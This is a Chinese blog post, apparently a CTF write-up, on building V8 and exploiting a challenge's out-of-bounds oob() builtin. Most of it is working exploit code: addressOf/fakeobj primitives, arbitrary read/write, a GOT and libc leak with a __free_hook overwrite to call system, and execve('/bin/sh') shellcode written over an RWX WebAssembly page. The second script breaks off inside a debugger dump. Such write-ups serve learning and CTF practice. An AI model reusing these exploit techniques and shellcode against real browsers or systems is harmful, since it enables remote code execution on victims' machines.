<h2 id="下载depot-tools"><a href="#下载depot-tools" class="headerlink" title="下载depot_tools"></a>下载depot_tools</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="meta">$</span> echo 'export PATH=$PATH:"/path/to/depot_tools"' &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>

<h2 id="下载V8"><a href="#下载V8" class="headerlink" title="下载V8"></a>下载V8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> fetch v8</span><br><span class="line"><span class="meta">$</span> gclient sync</span><br></pre></td></tr></table></figure>

<h2 id="安装所需依赖"><a href="#安装所需依赖" class="headerlink" title="安装所需依赖"></a>安装所需依赖</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> cd v8</span><br><span class="line"><span class="meta">$</span> build/install-build-deps.sh</span><br></pre></td></tr></table></figure>

<h2 id="导入gdb脚本"><a href="#导入gdb脚本" class="headerlink" title="导入gdb脚本"></a>导入gdb脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ #在 ~/.gdbinit 中添加</span><br><span class="line">$ source /path/to/v8/tools/gdbinit</span><br><span class="line">$ source /path/to/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure>

<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>通常的教程的编译过程是这样的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> tools/dev/v8gen.py x64.release</span><br><span class="line"><span class="meta">$</span> #release版本</span><br><span class="line"><span class="meta">$</span> ninja -C out.gn/x64.release d8</span><br><span class="line"><span class="meta">$</span> #debug版本</span><br><span class="line"><span class="meta">$</span> ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure>

<p>此法不管release版本还是debug版本都不适合做题，因为release版本无法使用v8的指令，而debug版本在运行漏洞函数的时候会因为dcheck而报错终止。解决办法就是设置好编译选项，或者干掉dcheck的宏（我没成功）</p>
<p>于是我找到了另一种方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure>

<p>gm.py脚本中定义了一些编译选项，我发现它们刚好可以符合外面的要求，即在release版本中使用它定义的一些gdb指令</p>
<h1 id="关于debug"><a href="#关于debug" class="headerlink" title="关于debug"></a>关于debug</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> path/to/d8 --allow-natives-syntax path/to/js</span><br></pre></td></tr></table></figure>

<p>输入 <code>--allow-natives-syntax</code>参数可以使用v8的一些调试函数，作为新手，我接触到的有</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">%DebugPrint(obj);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<p>函数作用顾名思义</p>
<h1 id="关于exp"><a href="#关于exp" class="headerlink" title="关于exp"></a>关于exp</h1><h2 id="寻常方法"><a href="#寻常方法" class="headerlink" title="寻常方法"></a>寻常方法</h2><p>在本文开始的链接中，作者共介绍了两种方法，一种是寻常pwn题的思路，即读取got地址，读出libc地址，算出libc函数地址，最后覆盖<code>__free_hook</code>或者<code>__malloc_hook</code></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>该exp对应的偏移均是在<code>out.gn/x64.release/d8</code>中计算的偏移，即通常编译过程的release版本</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf)</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">n</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>:<span class="number">1.1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatMap = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> objMap = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj;</span><br><span class="line">    objArray.oob(floatMap);</span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>]) - <span class="number">1</span>n;</span><br><span class="line">    objArray.oob(objMap);</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objOf</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr + <span class="number">1</span>n);</span><br><span class="line">    floatArray.oob(objMap);</span><br><span class="line">    <span class="keyword">let</span> obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatMap);</span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatMap,</span><br><span class="line">    i2f(<span class="number">0</span>n),</span><br><span class="line">    i2f(<span class="number">0x41414141</span>n),</span><br><span class="line">    i2f(<span class="number">0x1000000000</span>n)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">fake_array_addr = addressOf(fake_array);</span><br><span class="line">fake_obj_addr = fake_array_addr + <span class="number">0x20</span>n + <span class="number">0x10</span>n;</span><br><span class="line">fake_obj = objOf(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10</span>n + <span class="number">1</span>n);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] write 0x"</span> + hex(data) + <span class="string">" to 0x"</span> + hex(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10</span>n + <span class="number">1</span>n);</span><br><span class="line">    <span class="keyword">let</span> data = f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] read from 0x"</span> + hex(addr) + <span class="string">" get 0x"</span> + hex(data));</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> get_elf_addr = [<span class="number">1</span>n, <span class="number">2</span>n];</span><br><span class="line"><span class="keyword">var</span> code_addr = read(addressOf(get_elf_addr.constructor) + <span class="number">0x30</span>n);</span><br><span class="line"><span class="keyword">var</span> elf_addr = read(code_addr + <span class="number">0x41</span>n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在对象的map中的constructor结构的code属性指向内存的固定偏移处有elf的text段的地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] elf addr 0x"</span> + hex(elf_addr));</span><br><span class="line"><span class="keyword">var</span> elf_base = elf_addr - <span class="number">0xaeae60</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] elf base 0x"</span> + hex(elf_base));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="keyword">var</span> free_got = elf_base + <span class="number">0xDB1708</span>n;</span><br><span class="line"><span class="keyword">var</span> free_addr = read(free_got);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] free address 0x"</span> + hex(free_addr));</span><br><span class="line"><span class="keyword">var</span> libc_base = free_addr - <span class="number">0x844f0</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] libc base 0x"</span> + hex(libc_base));</span><br><span class="line"><span class="keyword">var</span> sys_addr = libc_base + <span class="number">0x45390</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] system address 0x"</span> + hex(sys_addr));</span><br><span class="line"><span class="keyword">var</span> free_hook = libc_base + <span class="number">0x3c67a8</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] free hook 0x"</span> + hex(free_hook));</span><br><span class="line">            </span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line">write(addressOf(buffer) + <span class="number">0x20</span>n, free_hook);</span><br><span class="line">view.setFloat64(<span class="number">0</span>, i2f(sys_addr), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x676e6f6d652d6361</span>n)); </span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">8</span>, i2f(<span class="number">0x6c63756c61746f72</span>n)); </span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">16</span>, i2f(<span class="number">0x0000000000000000</span>n));</span><br><span class="line">    <span class="comment">// system(gnome-calculator) </span></span><br><span class="line">&#125;</span><br><span class="line">            </span><br><span class="line">get_shell();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于get_shell函数内部的数据是局部变量，所以在执行完函数的时候会释放，就会触发__free_hook</span></span><br></pre></td></tr></table></figure>

<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>该exp我只在d8中实现了，在题目所给的chrome中，可能由于编译选项的不同，导致偏移不同，但我目前也没有办法得到在chrome中v8的代码段地址</p>
<p>所以这种方法具有很大的局限性，只能自娱自乐</p>
<h2 id="覆写wasm代码段"><a href="#覆写wasm代码段" class="headerlink" title="覆写wasm代码段"></a>覆写wasm代码段</h2><p>该方法是利用了wasm代码段可读可写可执行的特性。但是在生成wasm代码的时候，不能够调用libc的函数，所以只能先导入wasm代码之后再找到它的地址，再把它修改成我们的shellcode来执行</p>
<p>wasm代码在线生成网址：<a href="https://wasdk.github.io/WasmFiddle/" target="_blank" rel="noopener">https://wasdk.github.io/WasmFiddle/</a></p>
<h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><p>由于无法确定libc基址，所以采用系统调用的方式来执行shellcode</p>
<p>shell.asm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov al, 0x3b</span><br><span class="line">    mov rdi, 0x68732f6e69622fff</span><br><span class="line">    shr rdi, 8</span><br><span class="line">    push rdi</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    syscall</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nasm -f elf64 ./shell.asm</span><br></pre></td></tr></table></figure>

<p>就得到了shell.o文件</p>
<p>执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> ld -o shell shell.o</span><br></pre></td></tr></table></figure>

<p>就得到了名为shell的可执行文件，执行它，测试我们编写的shellcode是否正确</p>
<p>执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> objcopy -O binary ./shell.o code</span><br></pre></td></tr></table></figure>

<p>就得到了一个名为code的文件，该文件中只有汇编代码，没有其他无用的信息</p>
<p>执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> xxd -i ./code</span><br></pre></td></tr></table></figure>

<p>就会得到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> __code[] = &#123;</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0xff</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>,</span><br><span class="line">  <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xef</span>, <span class="number">0x08</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __code_len = <span class="number">31</span>;</span><br></pre></td></tr></table></figure>

<p>如果是内联在c代码中，还可以用以下的形式来测试：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> __code[] = &#123;</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0xff</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>,</span><br><span class="line">  <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xef</span>, <span class="number">0x08</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __code_len = <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*CODE)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((CODE)__code)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我测试的时候失败了，原因是__code位于bss段，该段不可执行</p>
<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><p>先写一段无关的wasm代码，将其导入</p>
<p>然后在内存中就会存在一块可读可写可执行的区域，将shellcode放到这片区域然后执行wasm的函数指针就会触发shellcode</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf)</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">n</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>:<span class="number">1.1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatMap = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> objMap = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj;</span><br><span class="line">    objArray.oob(floatMap);</span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>]) - <span class="number">1</span>n;</span><br><span class="line">    objArray.oob(objMap);</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objOf</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr + <span class="number">1</span>n);</span><br><span class="line">    floatArray.oob(objMap);</span><br><span class="line">    <span class="keyword">let</span> obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatMap);</span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatMap,</span><br><span class="line">    i2f(<span class="number">0</span>n),</span><br><span class="line">    i2f(<span class="number">0x41414141</span>n),</span><br><span class="line">    i2f(<span class="number">0x1000000000</span>n)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">fake_array_addr = addressOf(fake_array);</span><br><span class="line">fake_obj_addr = fake_array_addr + <span class="number">0x20</span>n + <span class="number">0x10</span>n;</span><br><span class="line">fake_obj = objOf(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10</span>n + <span class="number">1</span>n);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] write 0x"</span> + hex(data) + <span class="string">" to 0x"</span> + hex(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10</span>n + <span class="number">1</span>n);</span><br><span class="line">    <span class="keyword">let</span> data = f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] read from 0x"</span> + hex(addr) + <span class="string">" get 0x"</span> + hex(data));</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7f</span>, <span class="number">0x03</span>, <span class="number">0x82</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x83</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x91</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x6d</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x6d</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0a</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x2a</span>, <span class="number">0x0b</span></span><br><span class="line">]);  <span class="comment">//做任何题这个数组都可以照搬过去</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read(addressOf(func) + <span class="number">0x18</span>n) - <span class="number">1</span>n;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x2e0fdf0a24d9</span></span><br><span class="line"><span class="comment">0x2e0fdf0a24d9: [Function] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x182d33284379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x2e0fdf082109 &lt;JSFunction (sfi = 0x800a2fc3b29)&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x0cb773240c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - function prototype: &lt;no-prototype-slot&gt;</span></span><br><span class="line"><span class="comment"> - shared_info: 0x2e0fdf0a24a1 &lt;SharedFunctionInfo 0&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x0cb773244ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - context: 0x2e0fdf081869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - code: 0x361a8e502001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - WASM instance 0x2e0fdf0a22e1</span></span><br><span class="line"><span class="comment"> - WASM function index 0</span></span><br><span class="line"><span class="comment"> - properties: 0x0cb773240c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x0800a2fc04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #name: 0x0800a2fc0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #arguments: 0x0800a2fc0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #caller: 0x0800a2fc03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> wasm_exported_function_data_addr = read(shared_info_addr + <span class="number">8</span>n) - <span class="number">1</span>n;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x2e0fdf0a24a1</span></span><br><span class="line"><span class="comment">0x2e0fdf0a24a1: [SharedFunctionInfo] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x0cb7732409e1 &lt;Map[56]&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x0cb773244ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - function_map_index: 144</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - expected_nof_properties: 0</span></span><br><span class="line"><span class="comment"> - language_mode: sloppy</span></span><br><span class="line"><span class="comment"> - data: 0x2e0fdf0a2479 &lt;WasmExportedFunctionData&gt;</span></span><br><span class="line"><span class="comment"> - code (from data): 0x361a8e502001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - function token position: -1</span></span><br><span class="line"><span class="comment"> - start position: -1</span></span><br><span class="line"><span class="comment"> - end position: -1</span></span><br><span class="line"><span class="comment"> - no debug info</span></span><br><span class="line"><span class="comment"> - scope info: 0x0cb773240c61 &lt;ScopeInfo[0]&gt;</span></span><br><span class="line"><span class="comment"> - length: 0</span></span><br><span class="line"><span class="comment"> - feedback_metadata: 0xcb773242a39: [FeedbackMetadata]</span></span><br><span class="line"><span class="comment"> - map: 0x0cb773241319 &lt;Map&gt;</span></span><br><span class="line"><span class="comment"> - slot_count: 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read(wasm_exported_function_data_addr + <span class="number">0x10</span>n) - <span class="number">1</span>n;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x2e0fdf0a2479</span></span><br><span class="line"><span class="comment">0x2e0fdf0a2479: [WasmExportedFunctionData] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x0cb773245879 &lt;Map[40]&gt;</span></span><br><span class="line"><span class="comment"> - wrapper_code: 0x361a8e502001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - instance: 0x2e0fdf0a22e1 &lt;Instance map = 0x182d33289789&gt;</span></span><br><span class="line"><span class="comment"> - function_index: 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> code_addr = read(wasm_instance_addr + <span class="number">0x88</span>n);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; telescope 0x2e0fdf0a22e0 20</span></span><br><span class="line"><span class="comment">00:0000│   0x2e0fdf0a22e0 —▸ 0x182d33289789 ◂— 